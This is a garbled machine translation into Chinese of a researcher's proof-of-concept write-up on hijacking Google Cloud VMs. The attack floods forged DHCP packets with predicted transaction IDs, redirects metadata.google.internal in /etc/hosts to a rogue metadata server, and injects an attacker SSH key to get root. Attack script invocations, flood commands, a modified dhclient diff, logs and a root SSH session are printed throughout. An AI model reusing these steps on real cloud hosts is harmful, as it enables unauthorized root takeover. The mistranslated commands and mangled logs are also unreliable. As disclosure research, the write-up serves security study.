0x20\uff06lt;\u94fe\u63a5\uff06gt;\u4e59\u919a42\uff1a01\uff1a0A\uff1a80\uff1a00\uff1a02 Txqueulen 1000\uff08\u4ee5\u592a\u7f51\uff09RX\u6570\u636e\u53051336873\u5b57\u8282128485980\uff08122.5 MIB\uff09RX\u8bef\u5dee0\u4e22\u5f030 operruns 0\u5e270 Tx\u53055708403\u5b57\u82822012678044\uff081.8 Gib\uff09Tx\u8bef\u5dee0\u4e22\u5f030 operruns 0\u8f7d\u6ce20\u78b0\u649e0 \n\u8bf7\u6ce8\u610f\uff0cMAC\u5730\u5740\u7684\u6700\u540e4\u4e2a\u5b57\u8282\uff080a\uff1a80\uff1a00\uff1a02\uff09\uff0842\uff1a01\uff1a0a\uff1a80\uff1a00\uff1a02\uff09\u5b9e\u9645\u4e0a\u662f\u6846\u7684\u5185\u90e8IP\u5730\u5740\uff0810.128.0.2\uff09\u3002\u8fd9\u610f\u5473\u77403\u4e2a\u7ec4\u4ef6\u4e2d\u76841\u4e2a\u662f\u6709\u6548\u7684\u3002\n DHClient\u8fc7\u7a0b\u7684PID\u53ef\u9884\u6d4b\u3002 Linux\u5185\u6838\u4ee5\u7ebf\u6027\u65b9\u5f0f\u5206\u914d\u8fdb\u7a0bID.i\u53d1\u73b0PID\u5728290\u548c315\u4e4b\u95f4\u53d8\u5316\uff08\u901a\u8fc7\u91cd\u65b0\u542f\u52a8\u57fa\u4e8eDebian 10\u7684VM\u591a\u6b21\u548c\u68c0\u67e5PID\uff09\uff0c\u4f7f\u5f97\u79cd\u5b50\u7684\u8fd9\u79cd\u7ec4\u4ef6\u5bb9\u6613\u9884\u6d4b\u3002\n UNIX\u65f6\u95f4\u7ec4\u4ef6\u5177\u6709\u66f4\u5e7f\u6cdb\u7684\u57df\uff0c\u4f46\u8fd9\u7ed3\u679c\u4e0d\u662f\u5b9e\u9645\u95ee\u9898\uff08\u8bf7\u53c2\u9605\u4ee5\u540e\uff09\u3002\n GCP\u7684\u9632\u706b\u5899/\u8def\u7531\u5668\u901a\u8fc7VM\u53d1\u9001\u7684\u5e7f\u64ad\u6570\u636e\u5305\uff0c\u56e0\u6b64\u53ea\u6709\u5143\u6570\u636e\u670d\u52a1\u5668\uff08169.254.169.254\uff09\u6536\u5230\u5b83\u4eec\u3002\u4f46\u662f\uff0cDHCP\u534f\u8bae\u7684\u67d0\u4e9b\u9636\u6bb5Don\uff06\uff0339; t\u4f9d\u8d56\u5e7f\u64ad\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u9884\u5148\u8ba1\u7b97\u548c\u53d1\u9001\u7684\u6570\u636e\u5305\u3002\n \u8981\u5b89\u88c5\u6b64\u653b\u51fb\uff0c\u653b\u51fb\u8005\u9700\u8981\u4f7f\u7528\u4e00\u7ec4\u9884\u5148\u8ba1\u7b97/\u7591\u4f3cXID\u548c\u76f4\u63a5\u6cdb\u6ee5\u7684DHCP\u6570\u636e\u5305\u8fdb\u884c\u6cdb\u6ee5\uff08\u8fd9\u91cc\u6ca1\u6709\u5e7f\u64ad\uff09\u3002\u5982\u679cxid\u662f\u6b63\u786e\u7684\uff0c\u53d7\u5bb3\u8005\u673a\u5668alpiesthe\u7f51\u7edc\u914d\u7f6e\u3002\u8fd9\u662f\u4e00\u4e2a\u79cd\u65cf\u6761\u4ef6\uff0c\u4f46\u7531\u4e8e\u6d2a\u6c34\u5feb\u901f\u548c\u5f7b\u5e95\uff0c\u5143\u6570\u636eserver\u4ee5\u53ca\u6ca1\u6709\u771f\u6b63\u7684\u80dc\u5229\u673a\u4f1a\u3002\n \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5904\u4e8e\u91cd\u65b0\u914d\u7f6e\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u5806\u6808\u7684\u4f4d\u7f6e\u3002\n Google\u4f9d\u8d56\u4e8e\u5143\u6570\u636e\u670d\u52a1\u5668\uff0c\u5305\u62ecSSH\u516c\u94a5\u7684\u5206\u53d1\u3002\u8fde\u63a5\u5728\u7f51\u7edc/\u8def\u7531\u5c42\u5904\u4e8e\u7f51\u7edc/\u8def\u7531\u5c42\uff0c\u670d\u52a1\u5668\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\uff08\u4ec5\u9650TLS\uff0cClearhttp\uff09\u3002 Google_Guest_Agent\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u5904\u7406ThemetAdata Server\u7684\u54cd\u5e94\uff0c\u901a\u8fc7\u865a\u62df\u4e3b\u673a\u540dMetadata.Google.Internal\u5728/ etc / hosts\u6587\u4ef6\u4e2d\u5efa\u7acb\u8fde\u63a5\u3002\u6b64\u6587\u4ef6\u7531/etc/dhcp/dhclient-exit-hooks.d/google_set_hostnameAs\u7ba1\u7406DHCP\u54cd\u5e94\u5904\u7406\u7684\u6302\u94a9\u90e8\u5206\uff0c\u5e76\u4e14\u522b\u540d\u901a\u5e38\u7531\u6b64\u811a\u672c\u6dfb\u52a0\u5230\u6bcf\u4e2aDHCPACK\u4e2d\u3002Metadata Server\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236DHCP\u3002\u5192\u5145\u3002\u8fd9\u6b21\u653b\u51fb\u5df2\u7ecf\u53d1\u73b0\u4e86\u514b\u91cc\u65af\u83ab\u683c\u83b1\u65af\u7684\u653b\u51fb\uff0c\u4ed6\u7528\u4ed6\u7684\u5965\u65af\u6d1b\u5bbe\u666e\u7f57\u65af\u5eb7\u4fc3\u8fdb\u4e86\u6211\u7684\u7814\u7a76\u5728\u8fd9\u91cc\uff1a \n\u5dee\u5f02\u662f\uff0cDhclient\u8fc7\u7a0b\u7684\u6d2a\u6c34\u5728\u6211\u7684\u653b\u51fb\u4e2d\u8fdc\u7a0b\u5b8c\u6210\uff0c\u731c\u6d4bXID\u3002\n  \uff031\u6307\u793a\u5ba2\u6237\u7aef\u914d\u7f6eNIC\u4e0a\u7684Rogue Metadata Server\u7684IP\u5730\u5740\u3002\u8fd9\u6709\u6548\u5730\u5207\u65ad\u4e86\u76d2\u5b50\u7684\u4e92\u8054\u7f51\u8fde\u63a5\u3002 Google_Guest_Agent Can\uff06\uff0339; t\u8fd4\u56de\u8fde\u63a5\u771f\u5b9e\u7684\u5143\u6570\u636e\u670d\u52a1\u5668\u3002\u8fd9\u662fDHCP\u79df\u7ea6\u77ed\u6682\u7684\uff0815\u79d2\uff09\uff0c\u6240\u4ee5Dhclient\u518d\u6b21\u53d1\u9001DHCPRequest\u5e76\u5f00\u59cb\u5bfb\u627e\u65b0\u7684DHCPACK\u3002\n \u7531\u4e8e\u65b0\u7684IP\u5730\u5740\uff08Rouge Metadata Server\uff09\u548c\u65b0\u4e3b\u673a\u540d\uff08MetAdata.Google.com\uff09\u662f\u8be5TheDhcpack\u6570\u636e\u5305\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u6b64Google_set_hostname\u51fd\u6570\u6dfb\u52a0\u4e86\u5982\u4e0b\u6240\u793a\u7684\u4e24\u6761\u7ebf\uff0835.209.180.239\u662f\u6211\u4f7f\u7528\u7684rougemetadata server\uff09\uff1a\n  \u6b64\u65f6\u653b\u51fb\u8005\u4ecd\u5728\u6d2a\u6c34\uff0c\u56e0\u4e3aARP\u4e0d\u4f1a\u5feb\u901f\u5237\u65b0\uff0c\u56e0\u6b64\u8fd9\u4e9b\u6570\u636e\u5305\u9881\u53d1\u3002\n \uff032\u3002\u8fd8\u539f\u5de5\u4f5c\u7f51\u7edc\u5806\u6808\u4ee5\u53ca\u6709\u6548\u7684\u8def\u7531\u5668\u5730\u5740\u3002\u8fd9\u4e2adhcpack\u4e0d\u5305\u542b\u4e3b\u673a\u540d\uff0c\u56e0\u6b64google_set_hostname won\uff06\uff0339; t\u89e6\u6478/ etc / hosts\u3002\u4e2d\u6bd2\u5143\u6570\u636e.Google.internal\u6761\u76ee\u4ecd\u5728\u90a3\u91cc\u3002\n \u5982\u679c\u5728\u4e3b\u673a\u6587\u4ef6\u4e2d\u5b58\u5728\u591a\u4e2a\u6761\u76ee\uff0c\u5219Linux\u5185\u6838\u4f18\u5148\u8003\u8651\u94fe\u63a5\u672c\u5730\u5730\u5740\uff08169.254.169.254\uff09\u4f4e\u4e8e\u53ef\u8def\u7531\u5668\u3002\n \u6b64\u65f6Google_guest_Agent\u53ef\u4ee5\u4e0e\uff08Rouge\uff09\u5143\u6570\u636e\u670d\u52a1\u5668\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u5176\u4e2d\u5305\u542b\u653b\u51fb\u8005\u7684GetSA\u914d\u7f6e\u3002\u5c06\u8be5\u6761\u76ee\u586b\u5145\u5230/root/.ssh/authorized_keysand\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdc\u7a0b\u6253\u5f00\u6839\u58f3\u3002 \n\u653b\u51fb\u8005\u5c06\u5728\u4e0b\u9762\u7684\u6240\u6709\u653b\u51fb\u60c5\u666f\u4e2d\u5b8c\u5168\u8bbf\u95ee\u76ee\u6807\u865a\u62df\u673a\u3002\n \u653b\u51fb\uff031\uff1a\u9488\u5bf9\u540c\u4e00\u5b50\u7f51\uff08\u301c\u76f8\u540c\u9879\u76ee\uff09\u7684VM\uff0c\u800c\u5b83\u6b63\u5728\u91cd\u65b0\u542f\u52a8\u3002\u653b\u51fb\u8005\u9700\u8981\u5728\u53e6\u4e00\u4e2a\u4e3b\u673a\u4e0a\u5b58\u5728\u3002\n \u653b\u51fb\uff032\uff1a\u9488\u5bf9\u540c\u4e00\u5b50\u7f51\uff08\u301c\u76f8\u540c\u9879\u76ee\uff09\u7684VM\uff0c\u800c\u5237\u65b0\u79df\u7ea6\uff08\u56e0\u6b64\u4e0d\u9700\u8981\u91cd\u65b0\u542f\u52a8\uff09\u3002\u8fd9\u662f\u6bcf\u534a\u4e2a\u5c0f\u65f6\uff081800s\uff09\u8fdb\u884c\u6bcf\u534a\u4e2a\u5c0f\u65f6\uff0c\u8ba948\u4e2a\u7a97\u53e3/\u5c1d\u8bd5\u3002F\u7ea7VMS\u6709\u301c170.000 PPS\uff08\u6bcf\u79d2\u6570\u636e\u5305\uff09\uff0c\u5e76\u4e14\u4e00\u5929\u7684UNIXTIET +\u6f5c\u5728\u7684PID\u5236\u4f5c\u301c86420\u4e2a\u6f5c\u5728XID\uff0c\u8fd9\u662f\u4e00\u4e2a\u53ef\u884c\u7684\u653b\u51fb\u77e2\u91cf\u3002\n \u653b\u51fb\uff033\uff1a\u901a\u8fc7\u4e92\u8054\u7f51\u5b9a\u4f4dVM\u3002\u8fd9\u9700\u8981\u5728\u53d7\u5bb3\u8005VM\u524d\u9762\u7684\u9632\u706b\u5899\u5b8c\u5168\u6253\u5f00\u3002\u53ef\u4ee5\u5b8c\u5168\u6253\u5f00\u3002\u53ef\u4ee5\u907f\u514d\u5e38\u89c1\u573a\u666f\uff0c\u4f46\u7531\u4e8e\u5373\u4f7fGCP\u4e91\u63a7\u5236\u53f0\u7684WebUI\u4e5f\u6709\u4e00\u4e2a\u9009\u9879\uff0c\u5219\u5fc5\u987b\u5b58\u5728\u6b64\u914d\u7f6e\u7684\u4e00\u4e9bVM\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u653b\u51fb\u8005\u8fd8\u9700\u8981\u731c\u6d4bVM\u7684\u5185\u90e8IP\u5730\u5740\uff0c\u4f46\u81ea\u4ece\u7b2c\u4e00\u4e2aVM Seepsto\u83b7\u5f9710.128.0.2\u59cb\u7ec8\uff0c\u653b\u51fb\u53ef\u4ee5\u5de5\u4f5c\u3002\n   \u5982\u4e0a\u6240\u8ff0\uff0c\u60a8\u9700\u8981\u8fd0\u884c\u8fd0\u884c\u4e3b\u673a\u7684Rogue\u5143\u6570\u636e\u670d\u52a1\u5668\uff0c\u8be5\u670d\u52a1\u5668\u4e0e\u7aef\u53e380\u4eceInternet\u5f00\u7acb.I\u4e3a\u6b64\u76ee\u7684\u4f7f\u7528\u4e8635.209.180.239\uff08\u8fd9\u662f10.128.0.2\u7684\u516c\u5171IP\u5730\u5740\uff0c\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u8ba1\u7b97\u5f15\u64ce\u76d2\uff09\uff0c meta.py\u5728\u8fd9\u91cc\u8fd0\u884c\uff1a\n  \u5f53\u53d7\u5bb3\u6846\u91cd\u65b0\u542f\u52a8\u65f6\uff0c\u6211\u7684\u6982\u5ff5\u8bc1\u660e\u5229\u7528\u4e86\u7b80\u5316\u7684\u8bbe\u7f6e\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8f7b\u677e\u731c\u6d4bDHClient\u8fc7\u7a0b\u7684UNIXTIMEOF\u3002\n  \u53d7\u5bb3\u6846\u5728\u8fd9\u91cc\u662f10.128.0.4\u3002\u6b64\u4e3b\u673a\u7684\u516c\u5171IP\u5730\u5740\u4e3a34.67.219.89.\u9996\u5148\uff0c\u9996\u5148\uff0c\u6211\u4eec\u4f7f\u7528\u5c5e\u4e8eID_RSA.pub\u7684RSA\u79c1\u94a5\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbf\u95eeid_rsa.pub\uff0cfor meta.py\uff1a \n\u7136\u540e\u6211\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u952e\u5165\u91cd\u65b0\u542f\u52a8\uff0810.128.0.4\uff09\u3002 takeover -at -reboot.pl\u7684\u5176\u4f59\u8f93\u51fa\uff1a\n 10.128.0.4\u4f3c\u4e4e\u4e0d\u518d\u8fd0\u884c\u4e86\uff1aIP Addr show dev ens4 | awk\uff06\uff0339; / INET / {\u6253\u5370$ 2}\uff06\uff0339; | CUT -D / -F1\u8fd0\u884c\uff1aIP\u8def\u7531\u663e\u793a\u9ed8\u8ba4| awk\uff06\uff0339; /\u901a\u8fc7/ {\u6253\u5370$ 3}\uff06\uff0339; NIC\uff1aENS4 MIN PID\uff1a290 MAX PID\uff1a315 MIN TS\uff1a1601231808 MAX TS\uff1a1601231823\u6211\u7684IP\uff1a10.128.0.2\u8def\u7531\u5668\uff1a10.128.0.1\u76ee\u6807IP\uff1a10.128.0.4\u76ee\u6807MAC\uff1a42\uff1a01\uff1a0A\uff1a80\uff1a00\uff1a04\u6f5c\u5728XID\u6570\u91cf\uff1a41\u521d\u59cb\u62a5\u4ef7+ ACK\u6d2a\u6c34MAC\uff1a42\uff1a01\uff1a0A\uff1a80\uff1a00\uff1a04 SRC IP\uff1a10.128.0.2 DST IP\uff1a10.128.0.4\u65b0IP\uff1a35.209.180.239\u65b0\u4e3b\u673a\u540d\uff1aMetAdata.Google.Internal\u65b0\u8def\u7ebf\uff1aACK\uff1a\u771f\u5b9e\u62a5\u4ef7\uff1a\u771f\u5b9e\u7684oneShot\uff1a\u9519\u8bef\u6d2a\u6c34\u518d\u6b21\u6062\u590d\u539f\u59cb\u7f51\u7edc\u914d\u7f6eMac\uff1a42\uff1a01\uff1a0A\uff1a80\uff1a00\uff1a04 SRC IP\uff1a10.128.0.2 DST IP\uff1a10.128.0.4\u65b0IP\uff1a10.128\u3002 0.4\u65b0\u4e3b\u673a\u540d\uff1a\u65b0\u8def\u7ebf\uff1a10.128.0.1 ACK\uff1a\u771f\u5b9e\u4f18\u60e0\uff1aFalse OneShot\uff1aFalse\n \u5728\u6b64\u4e4b\u540e\uff0cMeta.py\u6b63\u5728\u8fd0\u884c\u7684\u5c4f\u5e55\u7684\u8f93\u51fa\u88ab\u6df9\u6ca1\uff0c\u5982\u4e0b\u6240\u793a\u7684\u884c\u6df9\u6ca1\uff1a\n  \u6b64\u65f6\uff0c\u6211\u53ef\u4ee5\u4f7f\u7528\u65b0\u7684\uff08\u653b\u51fb\u8005\u63a7\u5236\uff09SSH\u952e\u767b\u5f55\u53d7\u5bb3\u6846\u3002\n root @ builder\uff1a/ opt / _tmp / dhcp / exproit\uff03ssh -i id_rsa root@34.67.219.89 Linux\u5143\u6570\u636e4.19.0-11-cloud-amd64\uff031 SMP Debian 4.19.146-1\uff082020-09-17\uff09x86_64 Debian GNU / Linux\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u7a0b\u5e8f\u662f\u514d\u8d39\u8f6f\u4ef6;\u6bcf\u4e2a\u7a0b\u5e8f\u7684\u786e\u5207\u5206\u914d\u9879\u5728/ usr / share / doc / * /\u7248\u6743\u4e2d\u7684\u5404\u4e2a\u6587\u4ef6\u4e2d\u63cf\u8ff0\u3002 Debian GNU / Linux\u7edd\u5bf9\u6ca1\u6709\u4fdd\u4fee\uff0c\u5728\u9002\u7528\u6cd5\u5f8b\u5141\u8bb8\u7684\u8303\u56f4\u5185\u3002\u6839@\u5143\u6570\u636e\uff1a\u301c\uff03id uid = 0\uff08root\uff09gid = 0\uff08root\uff09\u7ec4= 0\uff08root\uff09\uff0c1000\uff08Google-sudoers\uff09\n   \u8981\u9a8c\u8bc1\u6b64\u8bbe\u7f6e\uff0c\u6211\u6784\u5efa\u4e86\u4e00\u4e2a\u7565\u5fae\u4fee\u6539\u7684dhclient\u7248\u672c;\u9664\u4e86\u4e00\u4e9b\u989d\u5916\u7684\u65e5\u5fd7\u7ebf\u5916\uff0c\u552f\u4e00\u4e00\u4e2a\u91cd\u8981\u7684\u53d8\u5316\u662f\u8fdb\u5165\u79df\u8d41\u7eed\u671f\u7684\u9891\u7387\uff1a\n *** DHCLIENT.C.ORIG 2020-09-29 23\uff1a38\uff1a16.322296529 +0200 --- DHCLIENT.C 2020-09-29 22\uff1a51\uff1a11.000000000 +0200 ************ *** void bind_lease\uff08\u5ba2\u6237\uff09*** 1573,1578 **** --- 1573,1580 ----\u5ba2\u6237 - \uff06gt; new = null; / *\u8bbe\u7f6e\u8d85\u65f6\u4ee5\u542f\u52a8\u7eed\u8ba2\u6d41\u7a0b\u3002 * / +\u5ba2\u6237\u7aef - \uff06gt; entive-\uff06gt; enewal = cur_time + 5; // hack\uff01+ tv.tv_sec = client-\uff06gt; entive-\uff06gt;\u7eed\u7ea6; TV.TV_USEC =\uff08\uff08\u5ba2\u6237\u7aef - \uff06gt; entive-\uff06gt; engewal  -  cur_tv.tv_sec\uff09\uff06gt; 1\uff09\uff1f myrandom\uff08\uff06\uff0334;\u6d3b\u52a8\u7eed\u7ea6\uff06\uff0334;\uff09\uff051000000\uff1acur_tv.tv_usec; \n\u4e00\u4e2a10\u5206\u949f\u7684\u7a97\u6237\u7531\u301c600\u4e2a\u7fc5\u8180\u7ec4\u6210\u3002\u6211\u91cd\u65b0\u542f\u52a8\u4e86\u53d7\u5bb3\u8005\u4e3b\u673a\uff0810.128.0.4\uff09\uff0c\u767b\u5f55\uff0cRAN JournalCTL -F | Grep Dhclient\u67e5\u770b\u6b63\u5728\u53d1\u751f\u7684\u4e8b\u60c5\u3002\u7136\u540e\u6211\u6267\u884c\u4e86TakeOver-At-renew.pl Scripton\u653b\u51fb\u8005\u673a\u5668\uff08\u5185\u90e8IP\uff1a10.128.0.2\uff0c\u5916\u90e8IP\uff1a35.209.180.239\uff0c\u540c\u4e00\u5b50\u7f51\u4e0a\u7684VM\uff09\uff1a\n   10\u670807\u65e507:06:05\u6d4b\u8bd5 - \u3010\u4e3e\u4f8b\u578b -  2 DHClient [301]\uff1aDHCPREQUEST\u4e3a10.128.0.4 ens4\u5230169.254.169.254\u7aef\u53e3670254 07:06:05 TEST-instance-2 dhclient [301]\uff1aDHCPACK\u4e3a10.128\u3002 0.4\u4ece169.254.169.2540CT 02 07:06:05 Test-instance-2 Dhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  - \u7eed\u8ba25\u79d2.Oct 02 07:06:10\u6d4b\u8bd5 -  instance-2 dhclient [301] \uff1aDHCPREQUEST\u4e3a10.128.0.4\u5728ENS4\u5230169.254.169.254\u7aef\u53e3670CT 02 07:06:10 TEST-instance-2 dhclient [301]\uff1a101.128.0.4\u4ece169.254.169.254oct 02 07:06:11\u6d4b\u8bd5 - \u5b9e\u4f8b - 2 dhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  - \u7eed\u8ba25\u79d2\u300202 07:06:16\u6d4b\u8bd5 - \u6848\u4f8b-2 dhclient [301]\uff1aDHCPREQUEST\u4e3a10.128.0.4 on ENS4\u5230169.254.169.254\u7aef\u53e367oct 02 07 \uff1a06\uff1a16 Test-instance-2 Dhclient [301]\uff1a10.128.0.4\u7684DHCPACK\u4ece169.254.169.2540CT 02 07:06:16\u6d4b\u8bd5 -  instance-2 dhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  -  5 seconds.oct 02 07:06:21 Test-instance-2 Dhclient [301]\uff1aDHCPRequest\u4e3a10.128.0.4\u5728ENS4\u5230169.254.169.254\u7aef\u53e3670254 02 07:06:21 Test-Instanc E-2 DHCLIENT [301]\uff1a10.128.0.4\u7684DHCPACK\u4ece169.254.169.2540CT 02 07:06:21\u6d4b\u8bd5 -  instance-2 dhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  - \u7eed\u8ba25\u79d2.Oct 02 07\uff1a 06:26 Test-instance-2 Dhclient [301]\uff1aDHCPREQUEST\u4e3a10.128.0.4\uff0c\u5728ENS4\u5230169.254.169.254\u7aef\u53e3670.254 07:06:26 TEST-instance-2 Dhclient [301]\uff1a10.128.0.4\u7684DHCPACK of 169.254\u3002 169.254OCT 02 07:06:26 Test-instance-2 dhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  - \u7eed\u8ba25\u79d2\u300202 07:06:31\u6d4b\u8bd5 - \u6848\u4f8b-2 dhclient [301]\uff1aDHCPREQUEST\u4e3a10.128 .0.4 ON ENS4\u5230169.254.169.254\u7aef\u53e3670CT 02 07:06:31 Test-instance-2 Dhclient [301]\uff1a35.209.180.239\u7684Dhcpack\u4ece10.128.0.2oct 02 07:06:32\u5143\u6570\u636edhclient [301]\uff1a\u7ed1\u5b9a\u523035.209.180.239  - \u7eed\u7ea6\u57285\u79d2\u5185.OCT 02 07:06:37\u5143\u6570\u636eDhclient [301]\uff1aDHCPRequest\u4e3a35.209.180.239 ens4\u523035.209.180.239\u7aef\u53e3670ct 02 07:06:44 Metadata Dhclient [301]\uff1adhcprequest 35.209.180.239\u5728ens4\u523035.209.180.239\u7aef\u53e3670ct 02 07:06:46\u5143\u6570\u636eDhclient [301]\uff1aDhcpack\u4e3a10.128.0.4\u4ece1 0.128.0.2oct 02 07:06:47\u5143\u6570\u636eDhclient [301]\uff1a\u7ed1\u5b9a\u523010.128.0.4  - \u57285\u79d2\u5185\u66f4\u65b0\u3002\n \u8fd9\u610f\u5473\u7740\u7b2c\u516d\u8f6e\u662f\u6210\u529f\u7684\u3002\u4e0e\uff0334;\u6b63\u5e38\uff06\uff0334;\u79df\u8d41\u66f4\u65b0\uff08\u672a\u88ab\u6279\u51c6\u7684Dhclient\uff09\uff0c\u540c\u6837\u7684\u4e8b\u60c5\u4f1a\u7559\u4e0b\u301c3\u4e2a\u5c0f\u65f6\u3002\n  root @ test-instance-2\uff1a\u301c\uff03cat /etc/hosts127.0.0.1 localhost :: 1 localhost ip6-localhost ip6-loopbackff02 :: 1 ip6-allnodesff02 :: 2 ip6-allrouters35.209.180.239\u5143\u6570\u636e.gooll\u3002 Google169.254.169.254\u6dfb\u52a0\u7684\u5185\u90e8\u5143\u6570\u636e\uff03169.254 Metadata.Google.Internal\uff03\u6dfb\u52a0\u5230Google\n \u6211\u91cd\u590d\u653b\u51fb\u5e76\u75283\u4e2a\u5c0f\u65f6\u7684XIDS\uff08\u301c10000\uff09\u6df9\u6ca1\u4e86\u53d7\u5bb3\u8005\u3002\u7b2c51\u6b21DHCPREQUEST\u88ab\u52ab\u6301\uff08\u4e0d\u4f1a\u6bd4\u4e0e\uff06\uff0334\u7684\u5b8c\u6574\u65e5\u62cd\u6444\u7684\u4e00\u70b9\u70b9\uff0c\uff06\uff0334;\u5e38\u89c4\uff06\uff0334;\u79df\u7ea6\u65f6\u4ee3\uff09\u3002\u6211\u5f97\u51fa\u7ed3\u8bba\uff0c\u6267\u884c\u65f6\u95f4\u786e\u5b9e\u4e0exids\u7684\u6570\u91cf\u76f8\u5173\u8054\u3002\u5f53\u7136\u4f1a\u964d\u4f4e\u6210\u529f\u5728\u73b0\u5b9e\u751f\u6d3b\u8bbe\u7f6e\u4e2d\u7684\u901f\u5ea6\uff0c\u4f46\u653b\u51fb\u4ecd\u7136\u53ef\u884c\u3002\n   \u6211\u53d1\u73b0\u6211\u7684DHCP\u76f8\u5173\u6570\u636e\u5305\u6ca1\u6709\u8f6c\u53d1\u5230VM\uff0c\u800cVM\u6b63\u5728\u91cd\u65b0\u542f\u52a8\uff08\u53ef\u80fd\u4e0d\u662f\u5728\u91cd\u542f\u65f6\u8fd4\u56deThelease\u540e\uff09\uff0c\u6709\u6548\u5730\u6392\u9664\u4e86TakeOver-at-discover.pl\u3002\n \u6211\u51b3\u5b9a\u5bf9\u79df\u8d41\u7eed\u7ea6\u8fdb\u884c\u653b\u51fb\uff08\u6709\u6548\u5730\u4e0e\uff032\u76f8\u540c\uff09\u3002\u6211\u7684\u671f\u671b\u662f\u5b83\u5e94\u8be5\u662f\u53ef\u884c\u7684\u3002 \n\u6211\u4f7f\u7528AWS VM\u4f5c\u4e3a\u653b\u51fb\u673a\u548c\u4e00\u4e2a\u975e\u5e38\u77ed\u7684\u65f6\u95f4\u7a97\u53e3\u6d4b\u8bd5\u4e86\u8fd9\u79cd\u60c5\u51b5\uff082\u5206\u949f\uff09\u3002\u5143\u811a\u672c\u4ecd\u5728GCP\u653b\u51fb\u673a\uff08\u5916\u90e8IP\uff1a35.209.180.239\uff09\u4e0a\u8fd0\u884c.i\u91cd\u65b0\u542f\u52a8\u53d7\u5bb3\u8005\u673a\u5668\uff08\u5185\u90e8IP\uff1a10.128.0.4\uff0c\u5916\u90e8IP\uff1a34.122.27.253\uff09\uff0c\u767b\u5f55\uff0cRAN JournalCTL -F | Grep Dhclient\u3002\n  root @ ip-172-31-25-197\uff1a\u301c/ real8\uff03nic = eth0 oneShot_window_min = 2 final_ip = 10.128.0.4 my_router = 10.128.0.1 ./takeover-at-renew.pl 34.122.27.253 35.209.180.239\u57281601651865\u548c1601651984RUN\u4e4b\u95f4\u7684XIDS\uff1aIP ADDR SHOW DEV ETH0 | awk\uff06\uff0339; / INET / {\u6253\u5370$ 2}\uff06\uff0339; | CUT -D / -F1RUN\uff1a/ ROOT / REAL8 / RANDR 10.128.0.4 290 315 16016519865 1601651984 2\uff06gt; / dev / null |\u7c98\u8d34-sd\uff06\uff0339;\uff0c\uff06\uff0339; - \uff06gt; /tmp/xids.txtric\uff1aeth0min pid\uff1a290max pid\uff1a315min ts\uff1a1601651865max ts\uff1a1601651865max ts\uff1a1601651984Attacker IP\uff1a172.31.25.197Router\uff1a10.128.0.1target IP\uff08\u521d\u59cb\u9636\u6bb5\uff09\uff1a34.122.27.253target Mac\uff1a42:01\uff1a 0A\uff1a80\uff1a00\uff1a04Target IP\uff08\u6700\u7ec8\u9636\u6bb5\uff09\uff1a10.128.0.434.122.27.253\u662f\u6d2a\u6c34\u6df9\u6ca1\u4e861801\u5e74SEC\u7684\u53d7\u5bb3\u8005\uff0c\u5728\u80cc\u666f\u4e2d\u76d1\u6d4b\u4e861801\u79d2\u7684\u80cc\u666f\uff1a/ ROOT / REAL8 /\u6d2a\u6c34 - \u7834\u574f15 -DEV eth0 -dstip 34.122.27.253-newhost metadata.google.internal -newip-newip 35.209.180.239 -srcip 172.31.25.197 -mac 42\uff1a01\uff1a0a\uff1a80\uff1a00\uff1a04 -xidfile /tmp/xids.txtmac\uff1a42\uff1a 01\uff1a0A\uff1a80\uff1a00\uff1a04SRC IP\uff1a172.31.25.197DST IP\uff1a34.122.27.253NEW IP\uff1a35.209.180.239NEW\u4e3b\u673a\u540d\uff1aMETAData.Google.InternalNEW\u8def\u7531\uff1aACK\uff1aTRUEOFFER\uff1aFalseNeLESHOT\uff1aXIDS\u7684Falsenumber\uff1a145\u4e3b\u673a\u5df2\u5173\u95ed\uff0c\u5b83\u53ef\u80fd\u541e\u566c\u4e86\u6bd2\u836f\u5e38\u6625\u85e4\uff01\u73b0\u5728\u6709\u4e9b\u6d2a\u6c34\u518d\u6b21\u6062\u590d\u8fde\u63a5\u4f3c\u4e4e\u653b\u51fb\u662f\u6210\u529f\u7684@ IP-172-31-25-197\uff1a\u301c/ Real8\uff03\u5728\u540e\u53f0\u8fd0\u884c12\u79d2\uff1a/ root / real8 /\u6d2a\u6c34-ack -ack -lease 1800 -dev eth0 -DSTIP 34.122.27.253 -NEWIP 10.128.0.4 -Route 10.128.0.1 -SRCIP 172.31.25.197 -MAC 42\uff1a01\uff1a0A\uff1a80\uff1a00\uff1a04 -XIDFILE /TMP/XIDS.TXTMAC\uff1a42\uff1a01\uff1a0A\uff1a80\uff1a 00\uff1a04SRC IP\uff1a172.31.25.197DST IP\uff1a34.122.27.253NEW IP\uff1a10.128.0.4NEW\u4e3b\u673a\u540d\uff1a\u65b0\u8def\u7531\uff1a10.128.0.1ACK\uff1aTRUEOFFER\uff1aFalseNeShot\uff1aXIDS\u7684Falsenumber\uff1a145\n \u8fd9\u662f\u5728\u7b2c21\u79d2\u7684\u7b2c21\u9636\u6bb5\u8fd0\u884c\u4e86\u4e00\u6bb5\u65f6\u95f4\uff0c\u6700\u540e\u6210\u529f\u4e86\u3002\u6b63\u5e38\u79df\u8d41\u65f6\u62a5\uff0c\u8fd9\u5c06\u8fbe\u5230\u301c11\u5c0f\u65f6\u3002\u5143\u6570\u636e\u670d\u52a1\u5668\u5df2\u6210\u529f\u64ad\u51fa\uff1a\n 10\u670802\u65e515:21:30 Test-instance-2 Dhclient 